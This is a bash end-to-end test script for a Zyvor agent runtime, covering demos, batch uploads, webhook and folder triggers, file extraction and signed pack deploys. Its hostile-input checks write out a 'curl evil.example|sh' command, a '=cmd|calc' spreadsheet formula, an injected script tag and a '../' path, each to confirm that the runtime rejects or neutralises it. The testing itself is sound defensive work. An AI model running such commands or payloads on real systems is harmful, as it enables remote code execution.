#!/usr/bin/env bash
# Copyright 2026 Zyvor AI Labs · https://zyvor.dev
# SPDX-License-Identifier: Apache-2.0
#
# End-to-end test of the Keep one-click demos, user-defined use cases and signed
# pack deploys, against the real agent-runtime binary and the FluxVM stand-in
# (tests/sandbox_stub.py): guest commands run on this machine, there is no VM.
# It proves the runtime, the HTTP surface, the CLI and the signing path together.
# It does not prove cell isolation or 0-CONNECT enforcement: that needs FluxVM.
#
# Needs: node 20+, python3, curl. PDF demos also need pdftotext (poppler);
# they are skipped, and said to be skipped, when it is missing.

set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/zyvor-demos-ci.XXXXXX")"
BIN="${ZYVOR_AGENT_BIN:-$ROOT/agent-runtime/target/debug/zyvor-fabric-agent-runtime}"
CLI="$ROOT/sdk/agent-runtime/src/cli.js"
DEMO="$ROOT/scripts/keep-demo.sh"
KEEPCTL="$ROOT/scripts/keepctl"
# Free ports, so a busy developer machine or CI runner cannot break the test.
free_port() { python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])'; }
STUB_PORT=$(free_port)
RT_PORT=$(free_port); RT_EGRESS=$(free_port)
KEEP_PORT=$(free_port); KEEP_EGRESS=$(free_port)
BASE="http://127.0.0.1:$RT_PORT"
KEEP_BASE="http://127.0.0.1:$KEEP_PORT"
KEEP_TOKEN_VALUE="demos-ci-token"
PIDS=()
PASSED=0

fail() {
  echo "demos-ci: FAIL: $*" >&2
  for f in stub runtime keep-runtime; do
    [[ -f "$WORK/$f.log" ]] && { echo "----- $f -----" >&2; tail -n 40 "$WORK/$f.log" >&2; }
  done
  exit 1
}
ok() { PASSED=$((PASSED + 1)); echo "  ok  $*"; }

cleanup() {
  for p in ${PIDS[@]+"${PIDS[@]}"}; do kill "$p" 2>/dev/null || true; done
  wait 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT

json() { python3 -c 'import json,sys
d=json.load(sys.stdin)
for part in sys.argv[1].split("."):
    d = d[int(part)] if part.isdigit() else d[part]
print(d if not isinstance(d,(dict,list)) else json.dumps(d))' "$1"; }

wait_http() {
  for _ in $(seq 1 100); do curl -sf -o /dev/null "$1" && return 0; sleep 0.2; done
  return 1
}

[[ -x "$BIN" ]] || cargo build --manifest-path "$ROOT/agent-runtime/Cargo.toml"
[[ -d "$ROOT/sdk/agent-runtime/node_modules" ]] || npm install --prefix "$ROOT/sdk/agent-runtime" --no-audit --no-fund >/dev/null

mkdir -p "$WORK/sandboxes"
SANDBOX_STUB_PORT=$STUB_PORT SANDBOX_STUB_ROOT="$WORK/sandboxes" \
  python3 "$ROOT/agent-runtime/tests/sandbox_stub.py" >"$WORK/stub.log" 2>&1 &
PIDS+=($!)
for _ in $(seq 1 50); do curl -s -o /dev/null "http://127.0.0.1:$STUB_PORT/" && break; sleep 0.1; done

start_runtime() { # name listen egress [extra env...]
  local name=$1 listen=$2 egress=$3; shift 3
  mkdir -p "$WORK/$name-state" "$WORK/$name-snap"
  env "$@" \
    ZYVOR_AGENT_LISTEN="127.0.0.1:$listen" \
    ZYVOR_AGENT_EGRESS_LISTEN="127.0.0.1:$egress" \
    ZYVOR_AGENT_PROXY_LISTEN=off \
    ZYVOR_AGENT_FLUXVM_URL="http://127.0.0.1:$STUB_PORT" \
    ZYVOR_AGENT_EGRESS_ADVERTISE_HOST=127.0.0.1 \
    ZYVOR_AGENT_STATE_DIR="$WORK/$name-state" \
    ZYVOR_AGENT_SNAPSHOT_DIR="$WORK/$name-snap" \
    RUST_LOG=warn \
    "$BIN" >"$WORK/$name.log" 2>&1 &
  PIDS+=($!)
}

mkdir -p "$WORK/watch"
start_runtime runtime "$RT_PORT" "$RT_EGRESS" ZYVOR_AGENT_ALLOW_NO_AUTH=1 ZYVOR_AGENT_WATCH_ROOT="$WORK/watch"
wait_http "$BASE/healthz" || fail "runtime did not start"
export KEEP_API="$BASE"

echo "demos-ci: built-in use cases"
n=$(curl -sf "$BASE/v1/demos" | python3 -c 'import json,sys; d=json.load(sys.stdin)["demos"]; print(sum(1 for x in d if x["builtin"]))')
[[ "$n" == "7" ]] || fail "expected 7 built-in demos, got $n"
ok "GET /v1/demos lists 7 built-ins"

HAVE_PDF=1; command -v pdftotext >/dev/null || HAVE_PDF=0
# id | expected substring in the first artifact
CASES=(
  "pdf-brief|Keep vendor sample"
  "contract-clauses|## Governing law"
  "security-questionnaire|3 questions found, 1 without an answer"
  "meeting-actions|revised quote"
  "log-triage|| ERROR | 3 |"
  "sbom-summary|**Components:** 2"
  "csv-clean|'=HYPERLINK"
)
for c in "${CASES[@]}"; do
  id="${c%%|*}"; want="${c#*|}"
  case "$id" in pdf-brief|contract-clauses|security-questionnaire)
    if [[ "$HAVE_PDF" == "0" ]]; then echo "  skip $id (pdftotext not installed)"; continue; fi ;;
  esac
  sample=$(ls "$ROOT"/examples/keep-agents/"$id"/sample.* | head -1)
  resp=$(curl -sf -X POST -F "file=@$sample" "$BASE/v1/demos/$id") || fail "$id: request failed"
  [[ "$(echo "$resp" | json egress_connects)" == "0" ]] || fail "$id: egress_connects is not 0: $resp"
  aid=$(echo "$resp" | json artifacts.0.id)
  body=$(curl -sf "$BASE/v1/artifacts/$aid" | json body)
  echo "$body" | grep -qF -- "$want" || fail "$id: artifact missing '$want':
$body"
  ok "$id runs, 0 CONNECT, artifact has '$want'"
done
# The original PDF brief route and the script still work with the built-in sample.
if [[ "$HAVE_PDF" == "1" ]]; then
  # An empty multipart body (what the console and `pack deploy --test` send) means "use the sample".
  resp=$(curl -sf -X POST -F "note=none" "$BASE/v1/demos/pdf-brief") || fail "pdf-brief with no upload failed"
  [[ "$(echo "$resp" | json egress_connects)" == "0" ]] || fail "pdf-brief sample: egress_connects not 0"
  ok "pdf-brief with its built-in sample"
fi
out="$("$DEMO" csv-clean 2>&1)" || fail "keep-demo.sh csv-clean: $out"
echo "$out" | grep -q "0 CONNECT" || fail "keep-demo.sh did not report 0 CONNECT: $out"
"$DEMO" list | grep -q "^csv-clean" || fail "keep-demo.sh list missing csv-clean"
ok "keep-demo.sh run and list"

echo "demos-ci: run history, diff and keepctl verbs"
printf 'name,qty\nAnn,1\nBob,2\n' > "$WORK/h1.csv"
printf 'name,qty\nAnn,1\nBob,3\nCy,4\n' > "$WORK/h2.csv"
"$KEEPCTL" run csv-clean "$WORK/h1.csv" >/dev/null || fail "keepctl run (first)"
sleep 1
"$KEEPCTL" run csv-clean "$WORK/h2.csv" >/dev/null || fail "keepctl run (second)"
"$KEEPCTL" list | grep -q "^csv-clean" || fail "keepctl list missing csv-clean"
ids=$("$KEEPCTL" artifacts --use-case csv-clean | grep " clean.csv" | awk '{print $1}')
[[ "$(echo "$ids" | wc -l | tr -d ' ')" -ge 2 ]] || fail "expected at least 2 clean.csv artifacts for csv-clean: $ids"
[[ -z "$("$KEEPCTL" artifacts --use-case no-such-use-case)" ]] || fail "use-case filter leaked other artifacts"
[[ -z "$("$KEEPCTL" artifacts --since 2999-01-01T00:00:00Z)" ]] || fail "since filter returned artifacts from the past"
ok "keepctl run/list/artifacts with use-case and since filters"
newer=$(echo "$ids" | sed -n 1p); older=$(echo "$ids" | sed -n 2p)
"$KEEPCTL" diff "$older" "$newer" | tee "$WORK/diff.out" >/dev/null
grep -q "added" "$WORK/diff.out" && grep -q "^+ " "$WORK/diff.out" || fail "diff shows no added line: $(cat "$WORK/diff.out")"
ok "keepctl diff compares two runs"
"$KEEPCTL" audit --limit 5 2>"$WORK/chain.err" | grep -q . || fail "keepctl audit printed no rows"
grep -q "chain:" "$WORK/chain.err" || fail "keepctl audit did not report the chain"
"$KEEPCTL" approvals >/dev/null || fail "keepctl approvals failed"
ok "keepctl audit (with chain check) and approvals"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'content-type: application/json' \
  -d '{"kind":"note","title":"t","body":"x","ttl_seconds":0}' "$BASE/v1/artifacts")
[[ "$code" == "400" ]] || fail "ttl_seconds=0 should be 400, got $code"
tid=$(curl -sf -X POST -H 'content-type: application/json' \
  -d '{"kind":"note","title":"short-lived","body":"x","ttl_seconds":1}' "$BASE/v1/artifacts" | json id)
curl -sf "$BASE/v1/artifacts/$tid" >/dev/null || fail "artifact with a ttl should exist before it expires"
sleep 2
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/v1/artifacts/$tid")
[[ "$code" == "404" ]] || fail "expired artifact should be 404, got $code"
ok "artifact ttl: bad value refused, expired artifact is gone"

echo "demos-ci: batch upload and triggers"
printf 'name,qty\nD,1\n' > "$WORK/b1.csv"; printf 'name,qty\nE,2\n' > "$WORK/b2.csv"; printf 'name,qty\nF,3\n' > "$WORK/b3.csv"
out=$("$KEEPCTL" run csv-clean "$WORK/b1.csv" "$WORK/b2.csv" "$WORK/b3.csv") || fail "batch run failed: $out"
echo "$out" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["count"]==3 and d["ok"]==3 and d["failed"]==0 and d["egress_connects"]==0 and d["batch_id"], d' || fail "batch summary wrong: $out"
sessions=$(echo "$out" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(len({r["result"]["session_id"] for r in d["results"]}))')
[[ "$sessions" == "3" ]] || fail "batch should use one cell per file, got $sessions sessions"
ok "batch of 3: one cell per file, one batch id, 0 CONNECT"
printf 'MZ' > "$WORK/bad.exe"
code=$(curl -s -o "$WORK/mixed.json" -w '%{http_code}' -X POST -F "file=@$WORK/b1.csv" -F "file=@$WORK/bad.exe" "$BASE/v1/demos/csv-clean")
[[ "$code" == "207" ]] || fail "a batch with one bad file should be 207, got $code"
python3 -c 'import json; d=json.load(open("'"$WORK"'/mixed.json")); assert d["ok"]==1 and d["failed"]==1 and d["results"][1]["status"]==400, d' || fail "mixed batch report wrong: $(cat "$WORK/mixed.json")"
ok "mixed batch is 207: the good file ran, the wrong type was refused (400)"
python3 -c "print('x'*10)" > "$WORK/x.csv"
args=(); for i in $(seq 1 21); do args+=(-F "file=@$WORK/x.csv"); done
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "${args[@]}" "$BASE/v1/demos/csv-clean")
[[ "$code" == "400" ]] || fail "21 files should be refused (400), got $code"
ok "batch over 20 files refused (400)"

tr=$(curl -sf -X POST -H 'content-type: application/json' -d '{"use_case":"csv-clean","kind":"webhook"}' "$BASE/v1/triggers") || fail "create webhook trigger"
tid=$(echo "$tr" | json id); tsecret=$(echo "$tr" | json secret)
curl -sf "$BASE/v1/triggers" | grep -q "$tsecret" && fail "the trigger list leaked the secret"
printf 'name,qty\nG,7\n' > "$WORK/hook.csv"
resp=$("$KEEPCTL" trigger fire "$tid" "$tsecret" "$WORK/hook.csv") || fail "signed trigger fire failed"
[[ "$(echo "$resp" | json egress_connects)" == "0" ]] || fail "webhook run: egress_connects not 0"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'x-zyvor-signature: sha256=00' -H 'x-zyvor-filename: hook.csv' --data-binary @"$WORK/hook.csv" "$BASE/v1/triggers/$tid/hook")
[[ "$code" == "401" ]] || fail "bad signature should be 401, got $code"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v1/triggers/$(python3 -c 'import uuid; print(uuid.uuid4())')/hook")
[[ "$code" == "404" ]] || fail "unknown trigger should be 404, got $code"
ok "webhook trigger: signed call runs the use case, bad signature 401, unknown id 404, secret never listed"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'content-type: application/json' -d '{"use_case":"csv-clean","kind":"folder","dir":"../escape"}' "$BASE/v1/triggers")
[[ "$code" == "400" ]] || fail "folder dir with .. should be 400, got $code"
fr=$(curl -sf -X POST -H 'content-type: application/json' -d '{"use_case":"csv-clean","kind":"folder","dir":"inbox","interval_seconds":5}' "$BASE/v1/triggers") || fail "create folder trigger"
fid=$(echo "$fr" | json id)
printf 'name,qty\nH,9\n' > "$WORK/watch/inbox/drop1.csv"; printf 'MZ' > "$WORK/watch/inbox/skip.exe"
for _ in $(seq 1 40); do
  runs=$(curl -sf "$BASE/v1/triggers" | python3 -c 'import json,sys; print([t for t in json.load(sys.stdin)["items"] if t["id"]=="'"$fid"'"][0]["runs"])')
  [[ "$runs" -ge 1 ]] && break; sleep 1
done
[[ "$runs" == "1" ]] || fail "folder trigger should have run exactly once, runs=$runs"
sleep 12
runs=$(curl -sf "$BASE/v1/triggers" | python3 -c 'import json,sys; print([t for t in json.load(sys.stdin)["items"] if t["id"]=="'"$fid"'"][0]["runs"])')
[[ "$runs" == "1" ]] || fail "the same file must not run twice, runs=$runs"
ok "folder trigger: a dropped file ran once, wrong type ignored, no repeat"
"$KEEPCTL" trigger list | grep -q "$fid" || fail "keepctl trigger list missing the folder trigger"
"$KEEPCTL" trigger rm "$fid" && "$KEEPCTL" trigger rm "$tid" || fail "keepctl trigger rm"
[[ -z "$("$KEEPCTL" trigger list 2>/dev/null)" ]] || fail "triggers still listed after rm"
ok "keepctl trigger list and rm"

echo "demos-ci: more file types, new rules, zip"
python3 - "$WORK" <<'PY'
import sys, zipfile
w = sys.argv[1]
with zipfile.ZipFile(w + "/t.docx", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Payment due 30 days. Total 4,200 EUR</w:t></w:r></w:p></w:body></w:document>")
with zipfile.ZipFile(w + "/t.xlsx", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("xl/workbook.xml", '<workbook><sheets><sheet name="Orders" sheetId="1"/></sheets></workbook>')
    z.writestr("xl/sharedStrings.xml", "<sst><si><t>region</t></si><si><t>north</t></si><si><t>south</t></si></sst>")
    z.writestr("xl/worksheets/sheet1.xml", '<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row><row r="2"><c r="A2" t="s"><v>1</v></c></row><row r="3"><c r="A3" t="s"><v>1</v></c></row><row r="4"><c r="A4" t="s"><v>2</v></c></row></sheetData></worksheet>')
with zipfile.ZipFile(w + "/batch.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("one.csv", "a,b\n1,2\n"); z.writestr("sub/two.csv", "a,b\n3,4\n"); z.writestr("readme.txt", "skip me")
PY
printf '<html><body><h1>Status</h1><script>steal()</script><p>Server db-1 is DOWN since 09:00</p></body></html>' > "$WORK/t.html"
printf 'From a@x Mon\nFrom: Ann <a@x>\nSubject: Invoice\nDate: Mon, 1 Sep 2026\n\nPlease pay 300 EUR by Friday.\nFrom b@x Tue\nSubject: Lunch\n\nNoon?\n' > "$WORK/t.mbox"
printf '{"vendor":{"name":"Acme"},"items":[{"sku":"a"},{"sku":"b"}]}' > "$WORK/t.json"
mk() { curl -sf -X POST -H 'content-type: application/json' -d "$1" "$BASE/v1/demos" >/dev/null || fail "deploy use case: $1"; }
mk '{"id":"docx-check","title":"Docx check","accepts":["docx"],"extract":"docx","summary":[{"kind":"regex_extract","title":"Amounts","pattern":"([0-9][0-9,]*) EUR","group":1}]}'
mk '{"id":"xlsx-check","title":"Xlsx check","accepts":["xlsx"],"extract":"xlsx","summary":[{"kind":"csv_columns","title":"Regions","columns":["region"]},{"kind":"table","title":"Rows"}]}'
mk '{"id":"html-check","title":"Html check","accepts":["html"],"extract":"html","summary":[{"kind":"keyword_sections","title":"Alerts","keywords":["down"]}]}'
mk '{"id":"mbox-check","title":"Mbox check","accepts":["mbox","eml"],"extract":"eml","summary":[{"kind":"keyword_sections","title":"Money","keywords":["pay"]},{"kind":"regex_extract","title":"Subjects","pattern":"Subject: (.+)","group":1}]}'
mk '{"id":"json-check","title":"Json check","accepts":["json"],"extract":"text","summary":[{"kind":"json_path","title":"Facts","paths":["vendor.name","items[*].sku"]}]}'
body_of() { # use-case file
  local r; r=$("$KEEPCTL" run "$1" "$2") || fail "$1: run failed: $r"
  echo "$r" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["egress_connects"]==0, d; print(d["artifacts"][0]["id"])' | { read -r id; curl -sf "$BASE/v1/artifacts/$id" | json body; }
}
b=$(body_of docx-check "$WORK/t.docx");  echo "$b" | grep -qF "1× 4,200" || fail "docx: $b"; ok "docx extracted, regex_extract found the amount"
b=$(body_of xlsx-check "$WORK/t.xlsx");  echo "$b" | grep -qF "north (2)" || fail "xlsx: $b"; echo "$b" | grep -qF "| region |" || fail "xlsx table: $b"; ok "xlsx extracted, csv_columns and table rules work"
b=$(body_of html-check "$WORK/t.html");  echo "$b" | grep -qi "db-1 is DOWN" || fail "html: $b"; echo "$b" | grep -q "steal" && fail "html script leaked into the summary"; ok "html extracted, script dropped"
b=$(body_of mbox-check "$WORK/t.mbox");  echo "$b" | grep -qF "Please pay 300 EUR" || fail "mbox: $b"; echo "$b" | grep -qF "1× Lunch" || fail "mbox subjects: $b"; ok "mbox: both messages read, headers and body"
b=$(body_of json-check "$WORK/t.json");  echo "$b" | grep -qF "vendor.name\`: Acme" || fail "json_path: $b"; echo "$b" | grep -qF "a; b" || fail "json_path wildcard: $b"; ok "json_path reads keys and wildcards"
printf 'not a docx' > "$WORK/fake.docx"
code=$(curl -s -o "$WORK/fake.out" -w '%{http_code}' -X POST -F "file=@$WORK/fake.docx" "$BASE/v1/demos/docx-check")
[[ "$code" == "400" ]] || fail "a damaged docx should be 400, got $code: $(cat "$WORK/fake.out")"
ok "a damaged docx is refused (400), not summarised"
code=$(curl -s -o "$WORK/badre.out" -w '%{http_code}' -X POST -H 'content-type: application/json' -d '{"id":"bad-re","title":"Bad","accepts":["txt"],"extract":"text","summary":[{"kind":"regex_extract","title":"x","pattern":"(a)\\1"}]}' "$BASE/v1/demos")
[[ "$code" == "400" ]] || fail "a backreference pattern should be refused (400), got $code"
ok "regex with a backreference refused at deploy (400)"
out=$("$KEEPCTL" run csv-clean "$WORK/batch.zip") || fail "zip run failed: $out"
echo "$out" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["count"]==2 and d["ok"]==2 and d["egress_connects"]==0, d; assert sorted(r["filename"] for r in d["results"])==["one.csv","two.csv"], d' || fail "zip fan-out wrong: $out"
ok "zip: two csv files run in two cells, the .txt and the path ignored"
for id in docx-check xlsx-check html-check mbox-check json-check; do curl -sf -X DELETE "$BASE/v1/demos/$id" >/dev/null || fail "delete $id"; done

echo "demos-ci: validation and hostile input"
code=$(printf 'MZ' > "$WORK/evil.exe"; curl -s -o /dev/null -w '%{http_code}' -X POST -F "file=@$WORK/evil.exe" "$BASE/v1/demos/csv-clean")
[[ "$code" == "400" ]] || fail "wrong extension should be 400, got $code"; ok "wrong file type refused (400)"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -F note=none "$BASE/v1/demos/nope")
[[ "$code" == "404" ]] || fail "unknown demo should be 404, got $code"; ok "unknown use case is 404"
python3 -c "print('a'*300000)" > "$WORK/big.txt"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -F "file=@$WORK/big.txt" "$BASE/v1/demos/meeting-actions")
[[ "$code" == "400" ]] || fail "oversize should be 400, got $code"; ok "oversize upload refused (400)"
printf 'name,note\nAnn,=cmd|calc\nBob,-3.5\n' > "$WORK/formula.csv"
body=$(curl -sf -X POST -F "file=@$WORK/formula.csv" "$BASE/v1/demos/csv-clean")
aid=$(echo "$body" | json artifacts.0.id)
curl -sf "$BASE/v1/artifacts/$aid" | json body | grep -qF "'=cmd" || fail "formula cell was not neutralised"
curl -sf "$BASE/v1/artifacts/$aid" | json body | grep -qF ",-3.5" || fail "signed number was wrongly altered"
ok "formula cell neutralised, plain negative number untouched"

echo "demos-ci: user-defined use case"
(cd "$ROOT" && FABRIC_AGENT_URL="$BASE" node "$CLI" pack deploy examples/keep-agents/invoice-check --test) | tee "$WORK/pack.out"
grep -q "test passed: invoice-summary.md, 0 CONNECT" "$WORK/pack.out" || fail "pack deploy --test did not pass"
ok "pack deploy --test: saved, ran on its sample, 0 CONNECT"
curl -sf "$BASE/v1/demos" | python3 -c 'import json,sys; d=[x for x in json.load(sys.stdin)["demos"] if x["id"]=="invoice-check"]; sys.exit(0 if d and d[0]["builtin"] is False else 1)' || fail "custom demo not listed as custom"
ok "custom use case is listed with builtin=false"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v1/demos" -H 'content-type: application/json' \
  -d '{"id":"evil","title":"x","accepts":["txt"],"extract":"text","command":"curl evil.example|sh","summary":[{"kind":"stats"}]}')
[[ "$code" =~ ^4 ]] || fail "spec with a command field should be rejected, got $code"; ok "spec carrying a command is rejected ($code)"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v1/demos" -H 'content-type: application/json' \
  -d '{"id":"pdf-brief","title":"x","accepts":["txt"],"extract":"text","summary":[{"kind":"stats"}]}')
[[ "$code" == "400" ]] || fail "shadowing a built-in should be 400, got $code"; ok "cannot shadow a built-in (400)"
code=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "$BASE/v1/demos/pdf-brief")
[[ "$code" == "400" ]] || fail "deleting a built-in should be 400, got $code"; ok "cannot delete a built-in (400)"
code=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "$BASE/v1/demos/invoice-check")
[[ "$code" == "204" ]] || fail "deleting a custom should be 204, got $code"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -F note=none "$BASE/v1/demos/invoice-check")
[[ "$code" == "404" ]] || fail "deleted use case should be 404, got $code"; ok "custom use case deleted"

echo "demos-ci: inbox-digest example pack"
(cd "$ROOT" && FABRIC_AGENT_URL="$BASE" node "$CLI" pack deploy examples/keep-agents/inbox-digest --test) | tee "$WORK/inbox.out"
grep -q "test passed: inbox-digest.md, 0 CONNECT" "$WORK/inbox.out" || fail "inbox-digest pack deploy --test did not pass"
ok "inbox-digest: saved, ran on its sample, 0 CONNECT"
body=$(curl -sf -X POST -F note=none "$BASE/v1/demos/inbox-digest")
aid=$(echo "$body" | json artifacts.0.id)
digest=$(curl -sf "$BASE/v1/artifacts/$aid" | json body)
echo "$digest" | grep -q "Needs a reply" && echo "$digest" | grep -q "INV-2041" && echo "$digest" | grep -q "Meetings" || fail "inbox digest is missing expected sections"
printf '%s\n' "$digest" > "$WORK/inbox-digest.md"
ok "inbox-digest: the digest groups reply, money and meeting lines"
code=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "$BASE/v1/demos/inbox-digest")
[[ "$code" == "204" ]] || fail "deleting the inbox-digest use case should be 204, got $code"

echo "demos-ci: keepctl doctor"
"$KEEPCTL" doctor | tee "$WORK/doctor.out" >/dev/null || fail "keepctl doctor failed"
grep -q "FluxVM ready" "$WORK/doctor.out" && grep -q "7 built-in" "$WORK/doctor.out" || fail "doctor output unexpected"
ok "keepctl doctor reports FluxVM ready and 7 built-ins"

echo "demos-ci: signed pack deploy in Keep mode"
SEED=$(python3 -c 'print("07"*32)')
PUB=$(S=$SEED node --input-type=module -e "import('$ROOT/sdk/agent-runtime/src/sign.js').then(m=>console.log(m.publicKeyHex(process.env.S)))")
start_runtime keep-runtime "$KEEP_PORT" "$KEEP_EGRESS" \
  ZYVOR_AGENT_KEEP_MODE=1 ZYVOR_AGENT_POLICY_TRUSTED_SIGNERS="$PUB" ZYVOR_AGENT_API_TOKEN="$KEEP_TOKEN_VALUE"
wait_http "$KEEP_BASE/healthz" || fail "keep-mode runtime did not start"
export KEEP_TOKEN="$KEEP_TOKEN_VALUE"
PACK="$WORK/my-agent"; mkdir -p "$PACK"
cat > "$PACK/agent.ts" <<'TS'
import { defineAgent } from "@zyvor/fabric-agent";
export default defineAgent({ async run(ctx) { ctx.emit("hello", { text: "hi" }); return { ok: true }; } });
TS
cat > "$PACK/pack.json" <<'JSON'
{ "kind": "agent", "name": "my-agent",
  "manifest": { "template": "ci", "egress_mode": "deny", "confinement": "strict" },
  "goal": { "title": "Say hello", "text": "Say hello." } }
JSON
printf 'version: 1\ndefault_egress: deny\nallow: []\n' > "$PACK/keep.policy.yaml"

st=$(curl -sf -H "Authorization: Bearer $KEEP_TOKEN_VALUE" "$KEEP_BASE/v1/keep/status")
[[ "$(echo "$st" | json keep_mode)" == "True" && "$(echo "$st" | json trusted_signers)" == "1" ]] || fail "keep status unexpected: $st"
ok "/v1/keep/status: Keep mode on, 1 trusted signer"

if FABRIC_AGENT_URL="$KEEP_BASE" node "$CLI" pack deploy "$PACK" >"$WORK/unsigned.out" 2>&1; then
  fail "an unsigned agent deploy must be refused in Keep mode"
fi
grep -qi "signature" "$WORK/unsigned.out" || fail "unsigned refusal should mention the signature: $(cat "$WORK/unsigned.out")"
ok "unsigned deploy refused in Keep mode"

KEEP_POLICY_SEED="$SEED" FABRIC_AGENT_URL="$KEEP_BASE" node "$CLI" pack deploy "$PACK" --run | tee "$WORK/signed.out" >/dev/null \
  || fail "signed deploy failed: $(cat "$WORK/signed.out")"
grep -q "deploy agent my-agent (signed)" "$WORK/signed.out" && grep -q "/app/keep/" "$WORK/signed.out" || fail "signed deploy output unexpected: $(cat "$WORK/signed.out")"
ok "signed deploy + policy + session started (Node signature accepted by the Rust runtime)"

# What fabricd does for a console upload: forward the exact signed bytes with the header.
KEEP_POLICY_SEED="$SEED" node "$CLI" pack bundle "$PACK" --out "$WORK/my-agent.keeppack.json" >/dev/null
python3 - "$WORK/my-agent.keeppack.json" "$WORK" <<'PY'
import json, sys
e = json.load(open(sys.argv[1]))
open(sys.argv[2] + "/deploy.bytes", "w", newline="").write(e["deploy_json"])
open(sys.argv[2] + "/deploy.sig", "w").write(e["signature"])
open(sys.argv[2] + "/deploy.tampered", "w", newline="").write(e["deploy_json"] + " ")
PY
post() { curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $KEEP_TOKEN_VALUE" -H 'content-type: application/json' -H "x-keep-manifest-signature: $(cat "$WORK/deploy.sig")" --data-binary "@$1" "$KEEP_BASE/v1/agents"; }
[[ "$(post "$WORK/deploy.bytes")" == "201" ]] || fail "exact signed bytes should deploy (201)"
[[ "$(post "$WORK/deploy.tampered")" =~ ^40[13]$ ]] || fail "tampered bytes must be refused"
ok "bundle bytes verify; a one-byte change is refused"

echo "demos-ci: $PASSED checks passed"
